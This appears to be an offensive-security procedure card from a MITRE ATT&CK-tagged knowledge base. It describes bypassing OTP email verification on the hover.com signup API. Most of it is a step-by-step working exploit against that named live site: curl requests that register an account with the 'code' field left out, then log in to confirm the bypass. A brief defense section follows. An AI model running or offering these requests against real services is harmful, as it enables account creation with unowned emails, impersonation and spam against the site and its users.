---
id: proc-hover-otp-bypass-001
tags:
  - business-logic
  - otp-bypass
  - auth-bypass
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.488Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-OTP-Verification-in-Signup-Endpoint

## Summary

This procedure exploits a business logic error in the hover.com signup process where the backend does not enforce the OTP code parameter, allowing attackers to register accounts without verifying email ownership. It enables impersonation, spam, and denial of legitimate registrations.

## Description

The vulnerability occurs in the POST /signup API endpoint, which accepts JSON payloads with an 'account' object. Normally, this includes a 'code' field for OTP verification sent via email. However, omitting 'code' still processes the request successfully, returning a valid session. This was identified by analyzing API behavior and testing parameter omission. The attack targets web applications with flawed input validation, leading to unauthorized account creation at scale.

## Requirements

1. Access to the internet and ability to send HTTP POST requests to https://www.hover.com/signup
2. Knowledge of JSON payload structure for the endpoint
3. Optional: An arbitrary email address for testing (no ownership required)

## Defense

Defensive measures and detection strategies:

- Enforce mandatory OTP validation on the backend with explicit checks for the 'code' parameter
- Implement rate limiting on signup attempts per IP/email to prevent abuse
- Log and monitor signup requests missing OTP fields, alerting on anomalies
- Use CAPTCHA or additional verification for high-risk signups

## Objectives

1. Register an account without providing or verifying an OTP code
2. Gain a valid session for the new account using an unowned email
3. Demonstrate potential for impersonation or spam campaigns

## Instructions

### Step 1: Analyze Normal Signup Flow

**Context**: Send a standard request with OTP to baseline the endpoint behavior and confirm the payload structure.

**Command** (using curl for API testing):
```bash
curl -X POST https://www.hover.com/signup \
  -H "Host: www.hover.com" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -d '{"account":{"first_name":"Test","last_name":"User","email":"test@example.com","username":"testuser","password":"SecurePass123","terms_version":"1","tosValues":true,"code":"624187"}}'
```

> This command sends a complete payload including a sample OTP code. Expected output is HTTP 200 with {"success": true} if the OTP is valid.

### Step 2: Omit OTP Code Parameter

**Context**: Modify the payload to remove the 'code' field and resubmit to test bypass.

**Command** (using curl for bypassed request):
```bash
curl -X POST https://www.hover.com/signup \
  -H "Host: www.hover.com" \
  -H "Content-Type: application/json;charset=UTF-8" \
  -d '{"account":{"first_name":"Test","last_name":"User","email":"test@example.com","username":"testuser","password":"SecurePass123","terms_version":"1","tosValues":true}}'
```

> This omits 'code', exploiting the logic flaw. Expected output remains HTTP 200 with {"success": true}, confirming bypass.

### Step 3: Verify Account Creation

**Context**: Check login or email for confirmation that the account is active without OTP enforcement.

**Command** (optional login test with new credentials):
```bash
curl -X POST https://www.hover.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"SecurePass123"}'
```

> Successful login indicates the account is usable. No OTP email should be required or sent.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- business-logic
- otp-bypass
- auth-bypass
